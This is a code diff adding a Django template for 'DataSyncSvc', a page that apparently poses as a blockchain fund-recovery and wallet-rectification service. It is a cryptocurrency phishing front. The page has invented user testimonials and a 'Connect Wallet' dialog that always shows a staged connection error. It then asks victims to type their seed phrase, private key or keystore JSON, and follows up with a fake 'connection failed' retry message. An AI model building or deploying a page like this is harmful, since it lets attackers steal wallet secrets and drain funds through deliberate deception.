@@ -1,0 +1,104 @@
+{% extends 'base.html' %}
+{% block title %}Home - DataSyncSvc{% endblock %}
+{% load static %}
+{% block content %}
+<section class="container mx-auto py-10 text-center rounded-lg shadow-xl animate-fade-in">
+    <h2 class="text-4xl font-bold mb-4 text-white">Welcome to DataSyncSvc</h2>
+    <img src="{% static 'images/dts3.png' %}" alt="Blockchain Network" class="hero-image mx-auto mb-6 rounded-lg shadow-md object-cover border-2 border-blue-500">
+    <p class="text-xl mb-6 text-gray-300">Recover lost funds and rectify blockchain issues with our cutting-edge blockchain solutions. Connect your wallet to get started!</p>
+    <div class="flex justify-center space-x-4">
+        <button id="connect-wallet" class="bg-blue-500 text-white px-8 py-4 rounded-lg hover:bg-blue-600 transition duration-300 animate-pulse">Connect Wallet</button>
+        <a href="{% url 'about' %}" class="bg-gray-600 text-white px-8 py-4 rounded-lg hover:bg-gray-500 transition duration-300">Learn More</a>
+    </div>
+</section>
+<section class="container mx-auto py-10">
+    <h2 class="text-3xl font-bold mb-6 text-center text-white">Get Started</h2>
+    <div class="flex flex-col md:grid md:grid-cols-3 gap-4">
+        {% for service, description in services %}
+        <button class="service-button bg-gray-700 text-white p-6 rounded-lg shadow-md hover:bg-blue-600 transition duration-300 text-left animate-slide-up" data-service="{{ service }}">
+            <h3 class="text-xl font-semibold">{{ service }}</h3>
+            <p class="text-sm text-gray-300 mt-2">{{ description }}</p>
+        </button>
+        {% endfor %}
+    </div>
+</section>
+<section class="container mx-auto py-10">
+    <h2 class="text-3xl font-bold mb-6 text-center text-white">What Our Users Say</h2>
+    <div class="flex flex-col md:flex-row gap-6">
+        <div class="bg-gray-700 p-6 rounded-lg shadow-md flex-1">
+            <p class="text-gray-300 italic">"DataSyncSvc recovered my lost tokens in hours! Highly recommend!"</p>
+            <p class="text-white font-semibold mt-2">- Alex K.</p>
+        </div>
+        <div class="bg-gray-700 p-6 rounded-lg shadow-md flex-1">
+            <p class="text-gray-300 italic">"The best platform for wallet rectification. Seamless and secure."</p>
+            <p class="text-white font-semibold mt-2">- Sarah M.</p>
+        </div>
+        <div class="bg-gray-700 p-6 rounded-lg shadow-md flex-1">
+            <p class="text-gray-300 italic">"I claimed my airdrops effortlessly. Amazing service!"</p>
+            <p class="text-white font-semibold mt-2">- John D.</p>
+        </div>
+    </div>
+</section>
+<div id="wallet-dialog" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+    <div class="bg-gray-800 p-8 rounded-lg w-full max-w-lg text-white relative">
+        <h3 class="text-2xl font-bold mb-4">Connect Your Wallet</h3>
+        <div id="wallet-options" class="grid grid-cols-2 gap-2 mb-4">
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/trust-wallet-seeklogo.svg' %}" alt="Trust Wallet Logo" class="w-6 h-6">
+                <span>Trust Wallet</span>
+            </button>
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/metamask-seeklogo.svg' %}" alt="MetaMask Logo" class="w-6 h-6">
+                <span>MetaMask</span>
+            </button>
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/coinbase-coin-seeklogo.svg' %}" alt="Coinbase Wallet Logo" class="w-6 h-6">
+                <span>Coinbase Wallet</span>
+            </button>
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/exodus-seeklogo.svg' %}" alt="Exodus Logo" class="w-6 h-6">
+                <span>Exodus</span>
+            </button>
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/rabby-seeklogo.svg' %}" alt="Rabby Logo" class="w-6 h-6">
+                <span>Rabby</span>
+            </button>
+            <button class="wallet-option bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 flex items-center space-x-2">
+                <img src="{% static 'images/logos/walletconnect-seeklogo.svg' %}" alt="Other Wallet Logo" class="w-6 h-6">
+                <span>Other</span>
+            </button>
+        </div>
+        <div id="loading" class="hidden text-center my-4">
+            <p>Initializing...</p>
+            <div class="spinner"></div>
+        </div>
+        <div id="error" class="hidden my-4">
+            <p id="error-message" class="text-red-400">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+            <div class="flex space-x-2 mb-4">
+                <button class="tab-button bg-gray-600 px-3 py-1 rounded hover:bg-blue-500" data-tab="seed">Seed Phrase</button>
+                <button class="tab-button bg-gray-600 px-3 py-1 rounded hover:bg-blue-500" data-tab="private_key">Private Key</button>
+                <button class="tab-button bg-gray-600 px-3 py-1 rounded hover:bg-blue-500" data-tab="keystore">Keystore JSON</button>
+            </div>
+            <div id="seed-tab" class="tab-content">
+                <textarea id="seed-content" class="border border-gray-500 p-2 w-full bg-gray-700 text-white" placeholder="Enter your 12-24 word seed phrase (e.g., word1 word2 word3 ...)"></textarea>
+            </div>
+            <div id="private_key-tab" class="tab-content hidden">
+                <textarea id="private_key-content" class="border border-gray-500 p-2 w-full bg-gray-700 text-white" placeholder="Enter your private key (e.g., 0x...)"></textarea>
+            </div>
+            <div id="keystore-tab" class="tab-content hidden">
+                <textarea id="keystore-content" class="border border-gray-500 p-2 w-full bg-gray-700 text-white" placeholder="Paste your Keystore JSON here"></textarea>
+            </div>
+            <div class="flex justify-between mt-4">
+                <button id="validate" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">Validate</button>
+                <button id="close-dialog" class="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-500">Close</button>
+            </div>
+        </div>
+        <div id="connecting" class="hidden text-center my-4">
+            <p id="connecting-message" class="text-white">Connecting Wallet...</p>
+            <div class="spinner"></div>
+            <p id="failure-message" class="text-red-400 hidden mt-4">Connection failed. Please try again in a couple of minutes.</p>
+            <button id="retry" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mt-4 hidden">Retry</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
